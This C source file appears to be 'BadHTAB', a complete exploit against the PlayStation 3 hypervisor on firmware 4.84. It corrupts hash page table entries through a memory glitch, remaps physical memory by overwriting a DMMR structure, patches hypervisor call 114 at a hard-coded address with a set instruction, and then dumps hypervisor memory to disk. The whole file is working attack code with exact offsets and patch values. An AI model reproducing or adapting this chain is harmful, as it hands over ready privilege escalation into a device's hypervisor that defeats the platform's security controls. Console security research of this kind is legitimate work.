#include "Include.h"

//#define STAGE1_CFW 1
//#define STAGE2_CFW 1

double fwVersion = 0.0;

static const uint64_t GameOS_HTAB_EA_Addr = 0x800000000F000000;
static const size_t GameOS_HTAB_SizeInBytes = 0x40000;

static const uint32_t glitch_htab_begin_idx = 4500;
static const uint32_t glitch_htab_end_idx = 16000;

HTABE GameOS_HTAB_TmpBuf[HTAB_COUNT];

uint64_t CalcHTAB_EA_Addr_By_HtabIdx(uint64_t base, uint32_t htab_idx)
{
    return base + (htab_idx * sizeof(HTABE));
}

uint64_t CalcGameOSHTAB_EA_Addr_By_HtabIdx(uint32_t htab_idx)
{
    return GameOS_HTAB_EA_Addr + (htab_idx * sizeof(HTABE));
}

uint32_t FindFreeHTABIdx()
{
    uint32_t htab_idx;

    HTABE htabe;

    for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
	{
		lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

		if (!HTABE_IS_VALID(htabe))
			return htab_idx;
    }

    PrintLog("Can't find free htab!!!\n");
    abort();

    return 0;
}

uint32_t FindBadHTABIdx()
{
    uint32_t htab_idx;

    HTABE htabe;

    for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
	{
		lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

		if (HTABE_IS_VALID(htabe) && (HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) == SPECIAL_VA)
			return htab_idx;
    }

    PrintLog("Can't find bad htab!!!\n");
    abort();

    return 0;
}

bool FoundBadHTABIdx()
{
    uint32_t htab_idx;

    HTABE htabe;

    for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
	{
		lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

		if (HTABE_IS_VALID(htabe) && (HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) == SPECIAL_VA)
			return true;
    }

    return false;
}

void FindFirstLargestConsecutiveFreeHtabIdx(uint32_t *outIdx, uint32_t *outCount)
{
	uint32_t curLargestConsecutiveFreeCount = 0;
	uint32_t curLargestConsecutiveFreeFirstIdx = 0;

	uint32_t curFreeCount = 0;
	uint32_t curFreeFirstIdx = 0;

    HTABE htabe;

	uint32_t htab_idx;

	for (htab_idx = 0; htab_idx < HTAB_COUNT; htab_idx++)
	{
		lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

		if (HTABE_IS_VALID(htabe))
		{
			curFreeCount = 0;
			continue;
		}

		if (curFreeCount == 0)
			curFreeFirstIdx = htab_idx;

		curFreeCount++;

		if (curFreeCount > curLargestConsecutiveFreeCount)
		{
			curLargestConsecutiveFreeCount = curFreeCount;
			curLargestConsecutiveFreeFirstIdx = curFreeFirstIdx;
		}
	}

	if (outIdx)
		*outIdx = curLargestConsecutiveFreeFirstIdx;

	if (outCount)
		*outCount = curLargestConsecutiveFreeCount;
}

void PrintSingleHTAB(const HTABE* htab)
{
	PrintLog("0x%016lx => 0x%016lx  %d (%d:%d:%d:%d:%d:%d:%d)  0x%016lx, 0x%016lx\n",
		   (uint64_t)HTABE_GET_VA((*htab)), (uint64_t)HTABE_GET_RA((*htab)),
		   (uint32_t)htab->V, (uint32_t)htab->L, (uint32_t)htab->W,
		   (uint32_t)htab->I, (uint32_t)htab->M, (uint32_t)htab->G,
		   (uint32_t)htab->N, (uint32_t)htab->PP, htab->Num[0], htab->Num[1]);
}

void PrintHTABBase(uint64_t base)
{
    PrintLog("PrintHTABBase()...\n");

	static const uint64_t dumpSize = GameOS_HTAB_SizeInBytes;
	uint64_t dumpAddr = base;

	static const uint32_t htabCount = HTAB_COUNT;

	uint8_t* buf = (uint8_t*)malloc(dumpSize);

	lv2_read(dumpAddr, dumpSize, buf);

	HTABE* htab = (HTABE *)buf;

    PrintLog("       Virtual Address       Real Address        V  L W I M G N PP    Num1     Num2\n");

	for (uint32_t htab_idx = 0; htab_idx < htabCount; htab_idx++)
	{
		PrintLog("%u) 0x%016lx => 0x%016lx  %d (%d:%d:%d:%d:%d:%d:%d) 0x%016lx, 0x%016lx\n",
					htab_idx, (uint64_t)HTABE_GET_VA(htab[htab_idx]), (uint64_t)HTABE_GET_RA(htab[htab_idx]),
					(uint32_t)htab[htab_idx].V, (uint32_t)htab[htab_idx].L, (uint32_t)htab[htab_idx].W,
					(uint32_t)htab[htab_idx].I, (uint32_t)htab[htab_idx].M, (uint32_t)htab[htab_idx].G,
					(uint32_t)htab[htab_idx].N, (uint32_t)htab[htab_idx].PP, htab[htab_idx].Num[0], htab[htab_idx].Num[1]);
	}

	free(buf);
}

void PrintHTAB()
{
	PrintLog("PrintHTAB()...\n");

    PrintHTABBase(GameOS_HTAB_EA_Addr);
}

void PrintHTABBaseValidOnly(uint64_t base)
{
    PrintLog("PrintHTABBaseValidOnly()...\n");

	static const uint64_t dumpSize = GameOS_HTAB_SizeInBytes;
	uint64_t dumpAddr = base;

	static const uint32_t htabCount = HTAB_COUNT;

	uint8_t* buf = (uint8_t*)malloc(dumpSize);

	lv2_read(dumpAddr, dumpSize, buf);

	HTABE* htab = (HTABE *)buf;

	PrintLog("       Virtual Address       Real Address        V  L W I M G N PP    Num1     Num2\n");

	for (uint32_t htab_idx = 0; htab_idx < htabCount; htab_idx++)
	{
        if (!HTABE_IS_VALID(htab[htab_idx]))
            continue;

		PrintLog("%u) 0x%016lx => 0x%016lx  %d (%d:%d:%d:%d:%d:%d:%d) 0x%016lx, 0x%016lx\n",
					htab_idx, (uint64_t)HTABE_GET_VA(htab[htab_idx]), (uint64_t)HTABE_GET_RA(htab[htab_idx]),
					(uint32_t)htab[htab_idx].V, (uint32_t)htab[htab_idx].L, (uint32_t)htab[htab_idx].W,
					(uint32_t)htab[htab_idx].I, (uint32_t)htab[htab_idx].M, (uint32_t)htab[htab_idx].G,
					(uint32_t)htab[htab_idx].N, (uint32_t)htab[htab_idx].PP, htab[htab_idx].Num[0], htab[htab_idx].Num[1]);
	}

	free(buf);
}

void PrintHTABValidOnly()
{
	PrintLog("PrintHTABValidOnly()...\n");

    PrintHTABBaseValidOnly(GameOS_HTAB_EA_Addr);
}

void Stage1()
{
    PrintLog("Stage1...\n");

    if (FoundBadHTABIdx())
    {
        PrintLog("Already have bad htab, skipping...\n");
        return;
    }

    uint64_t loopCount = 0;

	uint32_t writeCount = 0;
	uint32_t readCount = 0;

	while (1)
	{
        bool stop = false;

        int32_t res;

		uint64_t lpar_addr;
		uint64_t muid;

		res = lv1_allocate_memory(SIZE_4KB, EXP_4KB, 0, 0, &lpar_addr, &muid);

		if (res != 0)
		{
			PrintLog("lv1_allocate_memory failed, res = %d\n", res);

            abort();
			return;
		}

        {
			HTABE htabe;

			uint32_t htab_idx;

			for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
			{
				lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

				if (HTABE_IS_VALID(htabe))
					continue;

				htabe_set_lpar(&htabe,
							   CALC_SPECIAL_VA(SPECIAL_VA, htab_idx), SPECIAL_VA_FLAGS_VALID,
							   lpar_addr, SPECIAL_RA_FLAGS_READWRITE);

				res = lv1_write_htab_entry(0, htab_idx, htabe.Num[0], htabe.Num[1]);

				if (res != 0)
				{
					PrintLog("lv1_write_htab_entry failed, htab_idx = %u, num0 = %lx, num1 = %lx, res = %d\n",
						   htab_idx, htabe.Num[0], htabe.Num[1], res);
				}

				writeCount++;
			}
		}

        // We should do memory glitch at this line
        // Sadly this is very painful on GameOS because unlike linux version
        // They can halt everything except exploit itself
        // This is not possible here, so we end up corrupt many things in the process
        res = lv1_release_memory(lpar_addr);

		if (res != 0)
		{
			PrintLog("lv1_release_memory failed, res = %d\n", res);

            abort();
			return;
		}

        {
			HTABE htabe;

			uint32_t htab_idx;

			uint32_t count = 0;

			for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
			{
				lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

				if ((HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) == SPECIAL_VA)
					readCount++;

				if (!HTABE_IS_VALID(htabe) || (HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) != SPECIAL_VA)
					continue;

				PrintLog("Bad HTAB found!!!, htab_idx = %u\n", htab_idx);

				if (count == 0)
				{
					lv2_beep_triple();
					Sleep(1);
					lv2_beep_triple();
					Sleep(2);
					lv2_beep_triple();
					Sleep(2);
					lv2_beep_triple();
					Sleep(2);
				}

                PrintSingleHTAB(&htabe);

				count++;
				stop = true;
			}
		}

        if (stop)
		{
			//PrintHTAB();
			break;
		}

        loopCount++;

		if ((loopCount % 5) == 0)
		{
			PrintLog("still alive... %lu, writeCount = %u, readCount = %u, delta = %d\n", loopCount, writeCount, readCount, (writeCount - readCount));

			lv2_beep_single();

            writeCount = 0;
			readCount = 0;
		}
    }
}

// CFW don't need glitching
// requires lv1 htab write protection patch
void Stage1_CFW()
{
    PrintLog("Stage1_CFW()\n");

    if (FoundBadHTABIdx())
    {
        PrintLog("Already have bad htab, skipping...\n");
        return;
    }

    int32_t res;

    uint64_t old_vas_id;

    res = lv1_get_virtual_address_space_id_of_ppe(PPE_ID0, &old_vas_id);

    if (res != 0)
    {
        PrintLog("lv1_get_virtual_address_space_id_of_ppe failed!!!, res = %d\n", res);

        abort();
        return;
    }

    PrintLog("old_vas_id = %lu\n", old_vas_id);

    uint64_t old_htab_lpar_addr = 0;
    res = lv1_map_htab(old_vas_id, &old_htab_lpar_addr);

    if (res != 0)
    {
        PrintLog("lv1_map_htab failed!!!, res = %d\n", res);

        abort();
        return;
    }

    PrintLog("old_htab_lpar_addr = 0x%lx\n", old_htab_lpar_addr);

    uint64_t old_htab_ea = 0x8000000014000000ul;
    map_lpar_to_lv2_ea(old_htab_lpar_addr, old_htab_ea, GameOS_HTAB_SizeInBytes, false, false);

	uint64_t lpar_addr;
	uint64_t muid;

	res = lv1_allocate_memory(SIZE_256KB, EXP_256KB, 0, 0, &lpar_addr, &muid);

	if (res != 0)
	{
		PrintLog("lv1_allocate_memory failed, res = %d\n", res);

        abort();
		return;
	}

    PrintLog("lpar_addr = 0x%lx\n", lpar_addr);

    uint32_t htab_idx = FindFreeHTABIdx();

    {
        HTABE htabe;

        htabe_set_lpar(&htabe,
            CALC_SPECIAL_VA(SPECIAL_VA, htab_idx), SPECIAL_VA_FLAGS_VALID,
            lpar_addr, SPECIAL_RA_FLAGS_READWRITE);

        res = lv1_write_htab_entry(0, htab_idx, htabe.Num[0], htabe.Num[1]);

        if (res != 0)
        {
            PrintLog("lv1_write_htab_entry failed, htab_idx = %u, num0 = %lx, num1 = %lx, res = %d\n",
                    htab_idx, htabe.Num[0], htabe.Num[1], res);

            abort();
        }
    }

    res = lv1_release_memory(lpar_addr);

	if (res != 0)
	{
		PrintLog("lv1_release_memory failed, res = %d\n", res);

        abort();
		return;
	}

    {
        HTABE htabe;

        lv2_read(CalcHTAB_EA_Addr_By_HtabIdx(old_htab_ea, htab_idx), sizeof(HTABE), &htabe);
        PrintSingleHTAB(&htabe);

        htabe.V = 1;
        lv2_write(CalcHTAB_EA_Addr_By_HtabIdx(old_htab_ea, htab_idx), sizeof(HTABE), &htabe);
        PrintSingleHTAB(&htabe);
    }

    res = lv1_unmap_htab(old_htab_lpar_addr);

    if (res != 0)
    {
        PrintLog("lv1_unmap_htab failed!!!, res = %d\n", res);

        abort();
        return;
    }

    PrintLog("Bad HTAB Idx = %u, htab_idx = %u\n", FindBadHTABIdx(), htab_idx);

    PrintLog("Stage1_CFW done\n");
}

void copy_htab_to_new_vas(uint64_t destVasID, uint64_t destHtabLpar, uint64_t destHtabRA,
    uint64_t srcHtabLpar, uint64_t srcHtabRA)
{
    PrintLog("copy_htab_to_new_vas()\n");

    int32_t res;

    uint32_t writeCount = 0;
    uint32_t shouldWriteCount = 0;
    uint32_t successWriteCount = 0;

    uint64_t ea;
    uint64_t ra;
    uint64_t my_lpar;

    HTABE* dest_htab = (HTABE*)0x8000000014000000ul;
    map_lpar_to_lv2_ea(destHtabLpar, (uint64_t)dest_htab, GameOS_HTAB_SizeInBytes, true, false);

    uint32_t htab_idx;
    uint32_t slb_idx;

    HTABE htabe;

    slb_read_all_entries();

    for (htab_idx=1; htab_idx < HTAB_COUNT; htab_idx++)
    {
        lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

        if(!HTABE_IS_VALID(htabe))
			continue;

        shouldWriteCount++;

        ea = 0xFFFFFFFFFFFFFFFF;

        for (slb_idx=0; slb_idx < SLB_COUNT; slb_idx++)
        {
            if(SLBE_IS_VALID(SLB[slb_idx]) &&
               SLBE_GET_VA(SLB[slb_idx]) == (HTABE_GET_VA(htabe)&0xFFFFFFFFFFFFF000))
            {
                ea = SLBE_GET_EA(SLB[slb_idx]);
            }
        }

        if(ea == 0xFFFFFFFFFFFFFFFF ||
			ea == SPECIAL_EA)
			continue;

        if(htabe.L)
			ra = htabe.Num[1] & 0xFFFFFFFFFFFFF000;
		else
			ra = HTABE_GET_RA(htabe);

		my_lpar = 0xFFFFFFFFFFFFFFFF;

		if(ra >= 0x01000000 && ra < 0x10000000)
		{
			if(ra >= 0x08000000) {
				my_lpar = (ra-0x08000000);
			} else {
				my_lpar = 0x6c0058000000 | (ra-0x01000000);
			}
		}
		else if((ra&0xFFFFFFFFFFF00000) == srcHtabRA)
			my_lpar = srcHtabLpar + (ra-srcHtabRA);
		else if((ra&0xFFFFFFFFFFF00000) == destHtabRA)
			my_lpar = destHtabLpar + (ra-destHtabRA);

        else if( ra == 0x3e0000 )
			my_lpar = 0x4000001a0000;
		else if( ra == 0x3e1000 )
			my_lpar = 0x4000001a1000;
		else if( ra == 0x8d3000 )
			my_lpar = 0x30000000e000;
		else if( ra == 0x8dd000 )
			my_lpar = 0x300000010000;
		else if( ra == 0x202000 )
			my_lpar = 0x300000012000;
		else if( ra == 0x203000 )
			my_lpar = 0x300000014000;
		else if( ra == 0x3ac000 )
			my_lpar = 0x300000016000;
		else if( ra == 0x3ad000 )
			my_lpar = 0x300000018000;
		else if( ra >= 0x28000080000 && ra < 0x28000088000 )
			my_lpar = 0x3c0000108000 + (ra-0x28000080000);

        if(my_lpar == 0xFFFFFFFFFFFFFFFF)
		{
			continue;
		}

        res = lv1_write_htab_entry(
            destVasID, htab_idx, htabe.Num[0], my_lpar|(htabe.Num[1]&0xFFF));

        writeCount++;

        if (res != 0)
        {
            PrintLog("lv1_write_htab_entry failed, htab_idx = %u, res = %d\n",
                    htab_idx, res);
        }

        if (dest_htab[htab_idx].Num[0] != htabe.Num[0] ||
            dest_htab[htab_idx].Num[1] != htabe.Num[1])
        {
            PrintLog("Verify HTAB failed, htab_idx = %u\n", htab_idx);

            PrintSingleHTAB(&htabe);
            continue;
        }

        successWriteCount++;
    }

    PrintLog("writeCount = %u, shouldWriteCount = %u, successWriteCount = %u\n", writeCount, shouldWriteCount, successWriteCount);
}

void direct_copy_htab_to_new_vas(uint64_t dest_lpar_addr)
{
    PrintLog("direct_copy_htab_to_new_vas\n");

    uint32_t htab_idx = 0;

    uint64_t dest_ea = 0x8000000014000000ul;
    map_lpar_to_lv2_ea(dest_lpar_addr, dest_ea, GameOS_HTAB_SizeInBytes, false, false); // cfw only

    HTABE htabe;

    for (htab_idx=0; htab_idx < HTAB_COUNT; htab_idx++)
    //for (htab_idx = 100; htab_idx < 5000; htab_idx++)
    {
        lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

        lv2_write(CalcHTAB_EA_Addr_By_HtabIdx(dest_ea, htab_idx), sizeof(HTABE), &htabe);
    }

    PrintHTABBase(dest_ea);
}

void direct_copy_htab_to_new_vas_slb_only(uint64_t dest_lpar_addr)
{
    PrintLog("direct_copy_htab_to_new_vas_slb_only\n");

    uint32_t htab_idx = 0;
    uint32_t dest_htab_idx = 0;

    uint64_t dest_ea = 0x8000000014000000ul;
    map_lpar_to_lv2_ea(dest_lpar_addr, dest_ea, GameOS_HTAB_SizeInBytes, false, false); // cfw only

    HTABE htabe;

    uint32_t writeCount = 0;

    slb_read_all_entries();
    for (htab_idx = 0; htab_idx < HTAB_COUNT; htab_idx++)
    {
        lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

        if(!HTABE_IS_VALID(htabe))
			continue;

        bool found = false;

        for (uint32_t slb_idx = 0; slb_idx < SLB_COUNT; slb_idx++)
        {
            if(SLBE_IS_VALID(SLB[slb_idx]) &&
               SLBE_GET_VA(SLB[slb_idx]) == (HTABE_GET_VA(htabe)&0xFFFFFFFFFFFFF000))
            {
                found = true;
                break;
            }
        }

        if (!found)
            continue;

        lv2_write(CalcHTAB_EA_Addr_By_HtabIdx(dest_ea, htab_idx), sizeof(HTABE), &htabe);

        writeCount++;

        dest_htab_idx++;
    }

    PrintHTABBaseValidOnly(dest_ea);

    PrintLog("writeCount = %u\n", writeCount);
}

void bad_copy_htab_to_new_vas(HTABE* dest_htab, HTABE* bad_htabe)
{
    PrintLog("bad_copy_htab_to_new_vas\n");

    uint32_t htab_idx = 0;

    HTABE htabe;

    //for (htab_idx = 0; htab_idx < HTAB_COUNT; htab_idx++)
    for (htab_idx = 0; htab_idx < 240; htab_idx++) // we can only too this much sadly... 4kb page is too small
    {
        PrintLog("Copying htab %u...\n", htab_idx);

        lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

        slb_add_segment(SPECIAL_EA, HTABE_GET_VA((*bad_htabe)), SLBE_KP);

        dest_htab[htab_idx].Num[0] = htabe.Num[0];
        dest_htab[htab_idx].Num[1] = htabe.Num[1];

        PrintLog("Copy htab %u ok\n", htab_idx);
    }
}

void Stage2()
{
    PrintLog("Stage2...\n");

    int32_t res;

    uint64_t htab_size;
    uint64_t num_page_sizes;
    uint64_t page_sizes;

    uint64_t new_vas_id;
    uint64_t old_vas_id;

    uint64_t act_htab_size;

    htab_size = EXP_256KB;
	num_page_sizes = 2;
	page_sizes = PAGE_SIZES(EXP_16MB, EXP_1MB);

    new_vas_id = 0;

    res = lv1_construct_virtual_address_space(htab_size, num_page_sizes, page_sizes,
		&new_vas_id, &act_htab_size);

    if (res != 0)
    {
        PrintLog("lv1_construct_virtual_address_space failed!!!, res = %d\n", res);
        return;
    }

    PrintLog("new_vas_id = %lu, act_htab_size = %lu\n", new_vas_id, act_htab_size);

    if (new_vas_id == 0)
    {
        PrintLog("bad vas id!!!\n");
        return;
    }

    uint64_t new_htab_lpar_addr = 0;
    res = lv1_map_htab(new_vas_id, &new_htab_lpar_addr);

    if (res != 0)
    {
        PrintLog("lv1_map_htab failed!!!, res = %d\n", res);
        return;
    }

    PrintLog("new_htab_lpar_addr = 0x%lx\n", new_htab_lpar_addr);

    uint64_t new_htab_real_addr = htab_ra_from_lpar(new_htab_lpar_addr);
    PrintLog("new_htab_real_addr = 0x%lx\n", new_htab_real_addr);

    res = lv1_get_virtual_address_space_id_of_ppe(PPE_ID0, &old_vas_id);

    if (res != 0)
    {
        PrintLog("lv1_get_virtual_address_space_id_of_ppe failed!!!, res = %d\n", res);
        return;
    }

    PrintLog("old_vas_id = %lu\n", old_vas_id);

    uint64_t old_htab_lpar_addr = 0;
    res = lv1_map_htab(old_vas_id, &old_htab_lpar_addr);

    if (res != 0)
    {
        PrintLog("lv1_map_htab failed!!!, res = %d\n", res);
        return;
    }

    PrintLog("old_htab_lpar_addr = 0x%lx\n", old_htab_lpar_addr);

    uint64_t old_htab_real_addr = htab_ra_from_lpar(old_htab_lpar_addr);
    PrintLog("old_htab_real_addr = 0x%lx\n", old_htab_real_addr);

    //

#if 1

    uint32_t htab_idx = FindBadHTABIdx();
    
    HTABE htabe;
    lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

    PrintLog("bad htab_idx = %u, ra = 0x%lx\n", htab_idx, HTABE_GET_RA(htabe));

    if (new_htab_real_addr != HTABE_GET_RA(htabe))
    {
        PrintLog("Not overlap!!!, failed!!!\n");
        return;
    }
    else
    {
        PrintLog("Overlap.\n");
    }

#endif

#if STAGE2_CFW
    PrintLog("Stage2_CFW()\n");
    //direct_copy_htab_to_new_vas(new_htab_lpar_addr);
    direct_copy_htab_to_new_vas_slb_only(new_htab_lpar_addr);
#else

    slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);

    HTABE* new_htab_rw = (HTABE*)CALC_SPECIAL_EA(SPECIAL_EA, htab_idx, htabe);

    bad_copy_htab_to_new_vas(new_htab_rw, &htabe);

    {
        uint64_t dest_ea = 0x8000000014000000ul;
        map_lpar_to_lv2_ea(new_htab_lpar_addr, dest_ea, GameOS_HTAB_SizeInBytes, true, false);

        PrintHTABBaseValidOnly(dest_ea);
    }

#endif



    PrintLog("lv2_write_lv1_rw_htabe()\n");
    //lv2_write_lv1_rw_htabe(old_vas_id, new_vas_id);

    while (1) {}



}

// offset in bytes:

// -80 = size
// 0 = ra
// 88 = lpar

struct DMMR_s
{
public:
    uint64_t ra;
    uint64_t size;
    uint64_t lpar_addr;
};

static const uint32_t dmmr_count = 512;
DMMR_s dmmrs[dmmr_count];

void Stage2_114()
{
    PrintLog("Stage2_114()\n");

    int32_t res;

    PrintLog("Allocating dmmrs\n");

    for (uint32_t i = 0; i < dmmr_count; i++)
    {
        DMMR_s* dmmr = &dmmrs[i];

        dmmr->ra = 0x28080000000ul + (i * 4096);
        //dmmr->size = 4096;
        dmmr->size = 0;
        dmmr->lpar_addr = 0;

        res = lv1_map_physical_address_region(dmmr->ra, EXP_4KB, dmmr->size, &dmmr->lpar_addr);

        if (res != 0)
        {
            PrintLog("lv1_map_physical_address_region failed!!!, res = %d\n", res);

            dmmr->lpar_addr = 0;
            break;
        }

        PrintLog("dmmr %u, ra = 0x%lx, size = %lu, lpar_addr = 0x%lx\n", i, dmmr->ra, dmmr->size, dmmr->lpar_addr);
    }

    //

    uint32_t htab_idx = FindBadHTABIdx();
    
    HTABE htabe;
    lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

    uint64_t htabe_ra = HTABE_GET_RA(htabe);

    PrintLog("bad htab_idx = %u, ra = 0x%lx\n", htab_idx, htabe_ra);

    //

    uint64_t* our_rw = (uint64_t*)CALC_SPECIAL_EA(SPECIAL_EA, htab_idx, htabe);
    //uint8_t* our_rw_u8 = (uint8_t*)our_rw;

    PrintLog("Checking for overlap...\n");

    bool found = false;
    
    uint64_t found_i = 0;

    DMMR_s* found_overlap_dmmr = NULL;
    uint32_t found_overlap_dmmr_i = 0;

    for (uint64_t i = 12; i < 4096 / 8; i++)
    {
        slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);

        uint64_t v = our_rw[i];
        uint64_t vsize = our_rw[i - 10];
        uint64_t vlpar = our_rw[i + 11];

        //PrintLog("v = %lx\n", v);

        for (uint32_t i2 = 0; i2 < dmmr_count; i2++)
        {
            DMMR_s* dmmr = &dmmrs[i2];

            if (dmmr->lpar_addr == 0)
                continue;

            if ((v == dmmr->ra) && (vsize == dmmr->size) && (vlpar == dmmr->lpar_addr))
            {
                found = true;
                
                found_i = i;

                found_overlap_dmmr = dmmr;
                found_overlap_dmmr_i = i2;

                break;
            }
        }

        if (found)
            break;
    }

    if (!found)
    {
        PrintLog("Not found, abort!\n");

        PrintLog("Cleanup...\n");

        for (uint32_t i = 0; i < dmmr_count; i++)
        {
            DMMR_s* dmmr = &dmmrs[i];

            if (dmmr->lpar_addr == 0)
                continue;

            res = lv1_unmap_physical_address_region(dmmr->lpar_addr);

            if (res != 0)
            {
                PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);

                abort();
                return;
            }
        }

        abort();
        return;
    }

    PrintLog("Found!, %lu, dmmr %u, ra = 0x%lx, size = %lu, lpar_addr = 0x%lx\n",
        found_i, found_overlap_dmmr_i, found_overlap_dmmr->ra, found_overlap_dmmr->size, found_overlap_dmmr->lpar_addr);

    //

    PrintLog("Cleanup unneeded dmmrs ...\n");

    for (uint32_t i = 0; i < dmmr_count; i++)
    {
        DMMR_s* dmmr = &dmmrs[i];

        if (dmmr->lpar_addr == 0 || dmmr == found_overlap_dmmr)
            continue;

        res = lv1_unmap_physical_address_region(dmmr->lpar_addr);

        if (res != 0)
        {
            PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);

            abort();
            return;
        }

        dmmr->lpar_addr = 0;
    }

    PrintLog("Cleanup done\n");

    // patch hvcall 114, map everywhere

    // set search    "\x39\x2B\x00\x6C\x7D\x6B\x03\x78\x7D\x29\x03\x78\x91\x49\x00\x00\x48\x00\x00\x08\x43\x40\x00\x18"
	// append search "\x80\x0B\x00\x00\x54\x00\x06\x30\x2F\x80\x00\x00\x41\x9E\xFF\xF0\x4B\xFF\xFD\x00"
	// set replace   "\x4B\xFF\xFD\x01"
	// set offset 40

    uint64_t want_ra = 0;

    if (fwVersion == 4.84)
        want_ra = 0x241ECC;
    else
    {
        PrintLog("firmware not supported!!!\n");

        abort();
        return;
    }

    uint64_t want_offset = (want_ra % 4096);

    PrintLog("want_ra = 0x%lx, want_offset = %lu\n", want_ra, want_offset);

    //

    uint64_t patched_ra = (want_ra - want_offset); // can be ANY address you want, must be 4096 aligned
    uint64_t patched_size = 4096; // this is maximum we can do
    
    slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);

    our_rw[found_i] = patched_ra;
    our_rw[found_i - 10] = patched_size;
    
    if (htab_ra_from_lpar(found_overlap_dmmr->lpar_addr) != patched_ra)
    {
        PrintLog("patch ra failed!!! abort()\n");

        abort();
        return;
    }

    PrintLog("patched ra = 0x%lx, size = %lu\n", patched_ra, patched_size);

    found_overlap_dmmr->ra = patched_ra;
    found_overlap_dmmr->size = patched_size;

    //

    uint64_t dest_ea = 0x8000000014000000ul;
    map_lpar_to_lv2_ea(found_overlap_dmmr->lpar_addr, dest_ea, patched_size, false, false);

#if 0

    for (uint64_t i = 0; i < 4096 / 8; i++)
    {
        uint64_t v;
        lv2_read(dest_ea + (i * 8), 8, &v);

        PrintLog("%lu, 0x%lx\n", i, v);
    }

#endif

    PrintLog("Patching hvcall 114 now!!!\n");

    {
        // 4B FF FD 00

        uint32_t old;
        lv2_read(dest_ea + want_offset, 4, &old);

        PrintLog("old = 0x%x\n", old);

        // 4B FF FD 01

        uint32_t newval = 0x4BFFFD01;
        lv2_write(dest_ea + want_offset, 4, &newval);

        PrintLog("new = 0x%x\n", newval);
    }

    PrintLog("Patch done!!!\n");

    // cleanup...

    PrintLog("Cleanup...\n");

    for (uint32_t i = 0; i < dmmr_count; i++)
    {
        DMMR_s* dmmr = &dmmrs[i];

        if (dmmr->lpar_addr == 0)
            continue;

        res = lv1_unmap_physical_address_region(dmmr->lpar_addr);

        if (res != 0)
        {
            PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);

            abort();
            return;
        }
    }
}

void DumpLv2Lv1()
{
    PrintLog("Dumping lv1 through lv2 to /dev_hdd0/lv2_lv1dump.bin ...\n");

    lv2_beep_triple();

    FILE* f = fopen("/dev_hdd0/lv2_lv1dump.bin", "wb");

    size_t dumpSize = 16 * 1024 * 1024;
    uint64_t dumpAddr = 0;

    void* buf = malloc(dumpSize);

    lv2_lv1_read(dumpAddr, dumpSize, buf);

    fwrite(buf, 1, dumpSize, f);

    free(buf);

    fflush(f);
    fclose(f);

    PrintLog("dump done.\n");

    lv2_beep_single();
}

void DumpLv1()
{
    PrintLog("Dumping lv1 to /dev_hdd0/lv1dump.bin ... This may take few minutes......\n");

    lv2_beep_long();

    FILE* f = fopen("/dev_hdd0/lv1dump.bin", "wb");

    size_t dumpSize = 16 * 1024 * 1024;
    uint64_t dumpAddr = 0;

    void* buf = malloc(dumpSize);

    lv1_read(dumpAddr, dumpSize, buf);

    fwrite(buf, 1, dumpSize, f);

    free(buf);

    fflush(f);
    fclose(f);

    PrintLog("dump done.\n");

    lv2_beep_single();
}

int main(int argc, char *argv[])
{
    lv2_beep_triple();

    InitLogging();

    PrintLog("BadHTAB by Kafuu(aomsin2526)\n");

    {
        FILE *fp;
	    fp = fopen("/dev_flash/vsh/etc/version.txt", "rb");

	    if (fp != NULL)
        {
		    char bufs[1024];

		    fgets(bufs, 1024, fp);
		    fclose(fp);

            fwVersion = strtod(bufs + 8, NULL);
        }
    }

    PrintLog("fwVersion = %lf\n", fwVersion);

    if (fwVersion != 4.84)
    {
        PrintLog("firmware not supported!\n");

        abort();
        return 0;
    }

#if STAGE1_CFW
    Stage1_CFW();
#else
    Stage1();
#endif

    Stage2_114();

    //Stage2();

    PrintLog("lv1_peek/poke now available.\n");

    DumpLv1();

    PrintLog("Bye!\n");

    DestroyLogging();

    Sleep(5);
    lv2_beep_long();
    Sleep(5);
    lv2_beep_triple();

    return 0;
}